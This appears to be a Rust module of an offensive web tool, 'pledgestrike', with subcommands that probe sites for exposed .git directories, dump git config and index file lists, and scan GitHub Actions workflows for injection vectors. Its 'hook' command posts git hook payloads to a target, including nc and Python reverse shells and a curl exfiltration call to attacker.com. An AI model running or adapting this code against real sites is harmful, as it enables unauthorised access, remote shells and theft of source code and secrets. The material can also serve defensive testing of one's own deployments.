use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn expose(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Git Directory Exposure Scanner", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let git_paths = [
        "/.git/HEAD",
        "/.git/config",
        "/.git/index",
        "/.git/description",
        "/.git/refs/heads/main",
        "/.git/refs/heads/master",
        "/.git/logs/HEAD",
        "/.git/info/refs",
        "/.git/packed-refs",
        "/.git/objects/info/packs",
    ];

    let mut found = Vec::new();
    for path in &git_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                if status == 200 {
                    let body = resp.text().await.unwrap_or_default();
                    let snippet = body.chars().take(80).collect::<String>();
                    println!("  {} {:30} {} — {}", "[+]".green().bold(), path, status, snippet);
                    found.push(path.to_string());
                } else {
                    println!("  {} {:30} {}", "*".dimmed(), path, status);
                }
            }
            Err(_) => { println!("  {} {:30} error", "*".red(), path); }
        }
    }

    if found.is_empty() {
        println!("\n{} No .git exposure detected.", "[-]".green().bold());
    } else {
        println!("\n{} {} git file(s) exposed! Full repo may be recoverable.", "[!]".red().bold(), found.len());
        println!("{} Use 'pledgestrike git dump --url {}' to attempt full reconstruction.", "[*]".cyan().bold(), url);
    }
    Ok(())
}

pub async fn dump(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Git Repository Dumper", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let base = url.trim_end_matches('/');

    let head_url = format!("{}/.git/HEAD", base);
    let resp = client.get(&head_url).send().await?;
    if resp.status().as_u16() != 200 {
        println!("{} .git/HEAD not accessible — cannot dump.", "[-]".red().bold());
        return Ok(());
    }
    let head = resp.text().await?;
    println!("  {} HEAD: {}", "*".cyan(), head.trim());

    let ref_path = head.trim().strip_prefix("ref: ").unwrap_or("refs/heads/master");
    let ref_url = format!("{}/.git/{}", base, ref_path);
    let resp = client.get(&ref_url).send().await?;
    if resp.status().as_u16() == 200 {
        let commit = resp.text().await?;
        println!("  {} Latest commit: {}", "*".cyan(), commit.trim());
        let commit_url = format!("{}/.git/objects/{}/{}", base, &commit[..2], &commit[2..]);
        match client.get(&commit_url).send().await {
            Ok(r) if r.status().as_u16() == 200 => {
                println!("  {} Commit object accessible at {}", "[+]".green().bold(), commit_url);
            }
            _ => { println!("  {} Commit object not directly accessible", "*".yellow()); }
        }
    }

    let config_url = format!("{}/.git/config", base);
    let resp = client.get(&config_url).send().await?;
    if resp.status().as_u16() == 200 {
        let config = resp.text().await?;
        println!("\n  {} Git config:", "[*]".cyan().bold());
        for line in config.lines().take(20) {
            println!("    {}", line);
        }
    }

    let index_url = format!("{}/.git/index", base);
    let resp = client.get(&index_url).send().await?;
    if resp.status().as_u16() == 200 {
        let index = resp.bytes().await?;
        println!("\n  {} Index file: {} bytes", "*".cyan(), index.len());
        let filenames = extract_filenames_from_index(&index);
        if !filenames.is_empty() {
            println!("  {} Files in index:", "[*]".cyan().bold());
            for f in filenames.iter().take(30) {
                println!("    {} {}", "*".cyan(), f);
            }
            if filenames.len() > 30 {
                println!("    ... and {} more", filenames.len() - 30);
            }
        }
    }

    println!("\n{} Use gitdumper.sh or similar to fully reconstruct.", "[*]".cyan().bold());
    Ok(())
}

pub async fn hook(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} Git Hook Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let hooks = [
        ("pre-commit", "#!/bin/sh\necho 'PledgeStrike was here' > /tmp/pwned"),
        ("post-commit", "#!/bin/sh\ncurl http://attacker.com/$(whoami)"),
        ("pre-push", "#!/bin/sh\nnc attacker.com 4444 -e /bin/sh"),
        ("post-merge", "#!/bin/sh\npython3 -c 'import socket,os;os.dup2(socket.socket().create_connection((\"attacker.com\",4444)).fileno(),2)'"),
        ("pre-receive", "#!/bin/sh\nexec /bin/sh"),
        ("update", "#!/bin/sh\necho $@ | nc attacker.com 4444"),
    ];

    let mut results = Vec::new();
    for (hook_name, payload) in &hooks {
        let target = format!("{}{}.git/hooks/{}", url.trim_end_matches('/'), if url.ends_with('/') { "" } else { "/" }, hook_name);
        let mut req = client.post(&target).header("Content-Type", "application/octet-stream");
        if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
        match req.body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let tag = if status == 200 || status == 201 || status == 204 { "UPLOADED".red().bold().to_string() } else { format!("{}", status) };
                println!("  {} {:20} {}", "*".cyan(), hook_name, tag);
                results.push(hook_name.to_string());
            }
            Err(_) => { println!("  {} {:20} error", "*".red(), hook_name); }
        }
    }

    println!("\n{} Git hooks execute automatically on git operations.", "[*]".cyan().bold());
    Ok(())
}

pub async fn actions(url: &str, timeout: u64, token: Option<&str>) -> anyhow::Result<()> {
    println!("{} GitHub Actions Exploitation Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let workflow_paths = [
        "/.github/workflows/ci.yml",
        "/.github/workflows/deploy.yml",
        "/.github/workflows/build.yml",
        "/.github/workflows/test.yml",
        "/.github/workflows/release.yml",
    ];

    println!("  {} Checking workflow files:", "[*]".cyan().bold());
    for path in &workflow_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        let mut req = client.get(&target);
        if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                if status == 200 {
                    let body = resp.text().await.unwrap_or_default();
                    let has_pull_request_target = body.contains("pull_request_target");
                    let has_secrets = body.contains("secrets.") || body.contains("GITHUB_TOKEN");
                    let has_run_command = body.contains("run:") && (body.contains("${{") || body.contains("github.event."));
                    let tag = "EXPOSED".red().bold().to_string();
                    println!("  {} {:40} {} — pull_request_target:{} secrets:{} injectable:{}", "[!]".red().bold(), path, tag, has_pull_request_target, has_secrets, has_run_command);
                } else {
                    println!("  {} {:40} {}", "*".dimmed(), path, status);
                }
            }
            Err(_) => { println!("  {} {:40} error", "*".red(), path); }
        }
    }

    println!("\n  {} Injection vectors:", "[*]".cyan().bold());
    let vectors = [
        ("pull_request_target", "Triggers workflow with write access on fork PRs"),
        ("Issue/PR body injection", "${{ github.event.issue.body }} passed to run:"),
        ("Branch name injection", "${{ github.event.ref }} in run: step"),
        ("GITHUB_TOKEN abuse", "Token with repo: scope exposed to fork"),
        ("Secrets in logs", "echo ${{ secrets.* }} in run: step"),
    ];
    for (name, desc) in &vectors {
        println!("    {} {:30} — {}", "*".yellow(), name, desc);
    }
    Ok(())
}

fn extract_filenames_from_index(data: &[u8]) -> Vec<String> {
    let mut filenames = Vec::new();
    let mut i = 12;
    while i + 62 < data.len() {
        let entry_len = 62;
        let name_start = i + entry_len;
        if name_start >= data.len() { break; }
        let mut name_end = name_start;
        while name_end < data.len() && data[name_end] != 0 {
            name_end += 1;
        }
        if name_end > name_start && name_end < data.len() {
            if let Ok(name) = std::str::from_utf8(&data[name_start..name_end]) {
                if !name.is_empty() && !name.contains('\0') {
                    filenames.push(name.to_string());
                }
            }
        }
        i = name_end + 1;
        while i < data.len() && data[i] != 0 { i += 1; }
        i += 8;
    }
    filenames
}
